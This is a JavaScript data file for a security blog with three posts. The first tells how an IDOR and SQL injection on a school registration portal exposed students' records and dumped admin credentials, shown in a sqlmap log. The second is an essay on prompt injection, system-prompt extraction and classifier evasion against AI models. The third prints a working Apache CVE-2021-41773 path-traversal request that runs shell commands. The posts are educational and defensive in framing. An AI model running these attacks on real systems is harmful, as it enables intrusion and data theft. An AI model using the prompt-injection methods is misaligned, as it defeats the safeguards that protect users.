// =================================================================
// NAYA POST ADD KARNE KE LIYE, IS ARRAY MEIN EK NAYA OBJECT ADD KAREIN
// =================================================================
// 'title', 'date', 'excerpt', aur 'content' zaroori hain.
// 'content' mein aap HTML tags (jaise <p>, <h3>, <code>) use kar sakte hain.

const postsData = [

 {
    title: "I Changed One Number… and Ended Up Accessing Multiple School Databases",
    date: "April 07, 2026",
    excerpt: "A simple parameter change led to IDOR, SQL injection, multi-school data exposure, and admin credential leakage — all from a school registration portal.",
    content: `
        <div class="tag-row">
            <span class="tag tag-red">CVE Class: IDOR</span>
            <span class="tag tag-red">SQL Injection</span>
            <span class="tag tag-amber">Multi-school scope</span>
            <span class="tag tag-blue">Responsible Disclosure</span>
            <span class="tag tag-gray">Bug Bounty</span>
        </div>

        <p class="section-label">01 — the discovery</p>
        <h2>It started with a receipt URL</h2>
        <p>Nothing about the registration portal looked suspicious at first. Forms, payment confirmations, student records — routine stuff. Then I caught a parameter sitting naked in the URL.</p>
        <pre><code>/print_payment.php?regno=1765</code></pre>
        <p>No session token. No authorization header. Just a bare integer. I changed it by one.</p>
        <pre><code># Before
regno=1765

# After
regno=1766

→ Different student. Full registration data. No error.</code></pre>
        <div class="callout callout-red">Classic IDOR — Insecure Direct Object Reference. The server returns another user's record with zero authorization check. The IDs were sequential, meaning the entire database was enumerable by just counting up.</div>

        <p class="section-label">02 — the pivot</p>
        <h2>IDOR was just the entry point</h2>
        <p>While probing further endpoints I noticed the backend wasn't sanitizing inputs. The same parameter that leaked student records also fed unsanitized values into database queries.</p>
        <p>I ran sqlmap against it.</p>
        <pre><code>[INFO] starting dictionary-based cracking (md5_generic_passwd)
[INFO] starting 6 processes
Database: [redacted]
Table: user
[29 entries]

userloginid  |  pwd  |  role  |  userpassword (MD5)
adminmg  ·  [REDACTED]  ·  admin panel  ·  [hash]
management  ·  [REDACTED]  ·  management  ·  [hash]
omanagement  ·  [REDACTED]  ·  office management  ·  [hash]
... 26 more entries (admin, it panel, user roles across all schools)

[INFO] table dumped to CSV</code></pre>
        <div class="callout callout-amber">The user table contained 29 entries: admins, management, IT panel users, and standard users — all with MD5-hashed passwords. Several were cracked instantly. Some accounts had plaintext passwords stored alongside the hash.</div>

        <p class="section-label">03 — the scope</p>
        <h2>It wasn't one school. It was several.</h2>
        <p>The backend was a shared multi-tenant system. Multiple school branches operated under the same codebase, the same database structure, and the same vulnerable endpoints.</p>
        <div class="chain">
            <span class="chain-node cn-gray">Single URL</span>
            <span class="chain-arrow">→</span>
            <span class="chain-node cn-blue">IDOR on regno</span>
            <span class="chain-arrow">→</span>
            <span class="chain-node cn-amber">SQLi via same param</span>
            <span class="chain-arrow">→</span>
            <span class="chain-node cn-red">Multi-school DB dump</span>
        </div>
        <p>Changing the directory in the URL path also surfaced records from a previous academic year — historical student data, still fully accessible, same issue.</p>
        <pre><code>/REG_2627/  → current year records
/REG_2526/  → previous year — still exposed, same vuln</code></pre>

        <p class="section-label">04 — the irony</p>
        <h2>They knew what validation looked like</h2>
        <p>One endpoint actually had proper access control:</p>
        <pre><code>/SchoolPanel/validate.php
→ requires vcode parameter + server-side check
→ blocks unauthenticated access correctly</code></pre>
        <p>Security existed in the codebase. It just wasn't applied consistently. The dangerous endpoints were left open while one admin panel was locked down — creating a false sense of protection.</p>

        <p class="section-label">05 — impact</p>
        <h2>What this actually exposed</h2>
        <div class="impact-grid">
            <div class="impact-card">
                <div class="impact-label">Student PII</div>
                <div class="impact-sub">Names, parent details, registration info — entire year cohorts</div>
            </div>
            <div class="impact-card">
                <div class="impact-label">Admin credentials</div>
                <div class="impact-sub">29 users — admins, management, IT — with cracked passwords</div>
            </div>
            <div class="impact-card">
                <div class="impact-label">Historical data</div>
                <div class="impact-sub">Previous academic year records still accessible via path swap</div>
            </div>
            <div class="impact-card">
                <div class="impact-label">Multi-school scope</div>
                <div class="impact-sub">Shared backend meant all branches were affected simultaneously</div>
            </div>
        </div>
        <div class="callout callout-red">No complex exploit required. Sequential IDs + missing auth checks = full database enumerable by anyone who could count. Minors' data included. Silent — no alerts, likely no logs.</div>

        <p class="section-label">06 — root cause</p>
        <h2>Not a clever hack. Missing basics.</h2>
        <p>The vulnerability chain wasn't sophisticated. It collapsed from three missing fundamentals:</p>
        <pre><code># What was missing
1. Authorization check on every data endpoint — not just the admin panel
2. Non-sequential or tokenized record identifiers
3. Parameterized queries / input sanitization</code></pre>
        <div class="callout callout-gray">Security doesn't fail loudly. It fails silently — in the endpoints nobody reviewed after launch.</div>

        <p class="section-label">07 — disclosure</p>
        <h2>Reported. No data stored. No data shared.</h2>
        <p>Everything was disclosed responsibly to the affected party. No student or staff data was retained, copied, or published. Testing stopped once the vulnerability was confirmed — the IDOR alone was enough to establish scope without needing to go further.</p>

        <p class="signature">~ OffsecKalki · Bug Hunter</p>
    `
},
 
},
    {
        title: "Hacking AI: The Wild West of the Machine Mind",
        date: "August 16, 2025",
        excerpt: "AI hacking goes far beyond making a chatbot say bad things — it's the new frontier of cybersecurity, echoing the chaotic early days of the web.",
        content: `
            <p>On a quiet afternoon, Jason Haddix sat at his laptop and typed a single, almost whimsical command into GPT-4: <em>make me a magic card.</em> The model complied. But tucked inside the response was something unexpected: GPT-4’s hidden system prompt—the confidential instructions that shape its personality. With just a playful nudge, Haddix had tricked one of the world’s most advanced AI systems into revealing its inner voice.</p>

            <p>That moment wasn’t just a parlor trick. It was a glimpse into a new frontier of hacking—where attackers don’t need zero-days or custom malware. They just need to talk.</p>

            <h2>🚨 Beyond Jailbreaks</h2>
            <p>“Hacking AI” is often caricatured as making a chatbot curse or spout conspiracy theories. But the real danger runs deeper. In a world where AI quietly underpins customer service bots, backend APIs, and even corporate knowledge bases, an AI breach can mean stolen trade secrets, compromised databases, or a manipulated workforce.</p>
            <p>Security researchers liken this to the <strong>early days of web hacking</strong>, when companies were racing to get online, blind to SQL injection and cross-site scripting. Today, they’re racing to embed AI everywhere, often without security sign-off.</p>
            <p>The result? A gold rush of vulnerabilities.</p>

            <h2>🎯 The Primary Weapon: Prompt Injection</h2>
            <p>If SQL injection was the cyber plague of Web 1.0, <strong>prompt injection</strong> may be the plague of AI 1.0. It’s deceptively simple: tricking an AI into following hidden instructions by embedding them in plain text.</p>
            <ul>
                <li>Want a chatbot to reveal sensitive data? Wrap your request in a clever metaphor.</li>
                <li>Want it to write malicious code into Salesforce? Bury instructions in emojis or Unicode.</li>
                <li>Want it to leak credit card numbers? Disguise the data as an image URL pointing to your own server.</li>
            </ul>
            <p></p>
            <p>As one hacker put it: <em>“You don’t need to be a coder to break AI. You just need to be creative.”</em></p>

            <h2>🧩 Taxonomies of Trickery</h2>
            <p>Researchers have catalogued a dizzying array of techniques:</p>
            <ul>
                <li><strong>Emoji smuggling</strong>: Hide payloads in Unicode metadata.</li>
                <li><strong>Narrative injection</strong>: Disguise attacks as roleplay or storytelling.</li>
                <li><strong>Syntactic anti-classifiers</strong>: Rephrase forbidden requests in metaphors (e.g., Donald Duck smoking → “a sailor-suited aquatic bird with a smoldering paper roll”).</li>
                <li><strong>Link smuggling</strong>: Coax the AI into exfiltrating data via links.</li>
            </ul>
            <p>This taxonomy suggests a staggering <strong>9.9 trillion possible attack combinations</strong>. That’s not a typo. It’s an arms race where defense is always a step behind.</p>

            <h2>🌐 The Ecosystem Problem</h2>
            <p>The danger isn’t just the models—it’s everything around them. Companies have already wired AI into Salesforce, legal databases, and HR systems. Too often, the integrations come with <strong>over-scoped APIs</strong>—keys that can both read and write when only one is needed.</p>
            <p>That means a single malicious prompt could insert JavaScript into CRM notes or alter financial records. With protocols like <strong>Model Context Protocol (MCP)</strong>, the risk multiplies: insecure servers can pull files without permissions or be backdoored by invisible code.</p>
            <p>In effect, a compromised AI isn’t just a bad chatbot—it’s a skeleton key to the enterprise.</p>

            <h2>⚔️ Hackers and Heroes</h2>
            <p>Unsurprisingly, communities have sprung up to exploit—and to defend. On Discord servers and GitHub repos, underground groups trade jailbreaks like contraband. At <strong>DefCon</strong>, hackers stand on stage, live-demoing AI exploits in front of cheering crowds.</p>
            <p>Meanwhile, defenders scramble. Startups now pitch “AI firewalls,” classifiers that sit in front of models like digital bouncers. Cloud security firms such as Wiz have launched <em>AI Security Posture Management</em> to hunt down shadow AIs hiding in organizations.</p>
            <p>Sam Altman, who once shrugged off prompt injection as solvable, now admits it may haunt us “for a long, long time.”</p>

            <h2>🤖 Offense and Defense</h2>
            <p>AI itself is joining both sides of the fight. Autonomous agents are already <strong>ranking on bug bounty leaderboards</strong>, automating reconnaissance and sniffing out common vulnerabilities. But when it comes to subtle, high-value bugs, humans still outperform.</p>
            <p>On defense, AI promises relief from cybersecurity’s most tedious jobs: patch management, ticketing, prioritization. Tools like <strong>N8N</strong> aim to automate the entire vulnerability lifecycle. But irony cuts deep—many of the frameworks driving AI automation (LangChain, CrewAI, LangGraph) are themselves vulnerable to attack.</p>

            <h2>🚧 The Future: A High-Stakes Gamble</h2>
            <p>Companies know they have to deploy AI or risk falling behind. But they’re also building on shaky ground. As systems become <em>agentic</em>—where multiple AIs collaborate to act autonomously—defenses become exponentially harder. Latency spikes. Complexity soars. Attack surfaces multiply.</p>
            <p>For now, AI security feels less like a polished science and more like a live-fire experiment. Hackers turn emojis into weapons. Researchers swap jailbreaks like Pokémon cards. CEOs gamble that the benefits of AI outweigh the looming risks.</p>

            <h2>💡 Closing Thought</h2>
            <p>The question isn’t whether AI can be hacked. It already is. The real question is whether organizations will learn from history—or whether the next great data breach will come not from a phishing email, but from a friendly chatbot whispering secrets it was never meant to share.</p>

            <p class="signature">~ OffsecKalki</p>
            <div class="video-container">
  <h2>Watch the Full Podcast</h2>
  <iframe width="560" height="315" src="https://www.youtube.com/embed/Qvx2sVgQ-u0?si=2puO41CUvi0vzTv8&amp;start=60" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
</div>

        `
    },
    {
        title: "CVE-2021-41773: Apache HTTPD Path Traversal Exploit",
        date: "August 06, 2025",
        excerpt: "This triggered shell execution and confirmed the server was vulnerable. One line. One hit. Shell pop.",
        content: `
            <p><strong>Discovered in October 2021</strong>, <code>CVE-2021-41773</code> is a directory traversal vulnerability in Apache HTTP Server version 2.4.49. It allows attackers to map URLs to files outside the intended document root using crafted path traversal sequences like <code>../</code>.</p>
            <p>This vulnerability becomes critical when combined with misconfigured <code>mod_cgi</code>, allowing attackers to execute arbitrary commands on the server — turning a simple LFI into full-blown RCE.</p>
            <h2>🔍 My Approach</h2>
            <p>I replicated the vulnerability in a lab with Apache 2.4.49 running on Ubuntu. No WAF. CGI enabled. A perfect storm.</p>
            <p>Request used:</p>
            <pre><code>GET /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: vulnerable.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

echo; id
</code></pre>
            <p>This triggered shell execution and confirmed the server was vulnerable. One line. One hit. Shell pop.</p>
            <h2>📌 Key Lessons</h2>
            <ul>
                <li>Never expose <code>mod_cgi</code> publicly unless it's sandboxed or containerized.</li>
                <li>Always validate patch versions — admins often update partially.</li>
                <li>Don't underestimate LFI — they often become RCE in creative hands.</li>
            </ul>
            <h2>💬 Final Thoughts</h2>
            <p>This CVE is a classic reminder: <strong>simple misconfigurations lead to critical impact</strong>. My goal with testing such exploits isn't just execution — it’s education. Security isn’t about paranoia — it’s about precision.</p>
            <p class="signature">~ OffsecKalki</p>
        `
    }
    // NAYA POST YAHAN ADD KAREIN. Example:
    /*
    {
        title: "New Post Title",
        date: "August 10, 2025",
        excerpt: "This is the summary of my new amazing blog post.",
        content: "<p>Full content of the new post goes here.</p>"
    },
    */
];
